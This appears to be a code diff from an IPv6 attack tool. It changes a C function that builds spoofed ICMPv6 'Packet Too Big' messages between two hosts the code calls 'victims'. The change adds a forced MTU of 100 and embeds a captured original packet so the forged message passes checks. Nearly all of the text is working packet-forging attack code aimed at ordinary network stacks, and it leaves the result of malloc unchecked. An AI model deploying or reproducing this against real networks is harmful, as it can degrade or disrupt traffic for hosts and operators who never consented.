@@ -118,16 +118,22 @@ static unsigned short icmp6_cksum(struct ip6_hdr *ip6) {
 }
 
 // WARN: needs to be freed
-char *alloc_pkt2big(struct victim *svic, struct victim *dvic) {
+char *alloc_pkt2big(struct victim *svic, struct victim *dvic, struct ip6_hdr *pkt) {
 	struct ethhdr *eth;
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmp6;
 	char *packet;
-	unsigned int len = sizeof(struct ethhdr) +
-						sizeof(struct ip6_hdr) +
-						sizeof(struct icmp6_hdr);
+	unsigned int len;
 
-	packet = malloc(len);
+	if (!victim_info_complete(svic) || !victim_info_complete(dvic) || pkt == NULL)
+		return NULL;
+
+	len = sizeof(struct ethhdr) +
+		sizeof(struct ip6_hdr) +
+		sizeof(struct icmp6_hdr) +
+		sizeof(struct ip6_hdr) + ntohs(pkt->ip6_plen);
+
+	packet = malloc(len );
 	memset(packet, 0, len);
 
 	/* Ethernet Header */
@@ -148,6 +154,11 @@ char *alloc_pkt2big(struct victim *svic, struct victim *dvic) {
 	/* ICMPv6 Header */
 	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 	icmp6->icmp6_type = ICMP6_PACKET_TOO_BIG;
+	icmp6->icmp6_mtu = htonl(100);
+
+	/* Adding the packet that was too big.. */
+	memcpy(((char *)icmp6 + sizeof(struct icmp6_hdr)), pkt,
+			htons(pkt->ip6_plen) + sizeof(struct ip6_hdr));
 
 	icmp6->icmp6_cksum = icmp6_cksum(ip6);
 
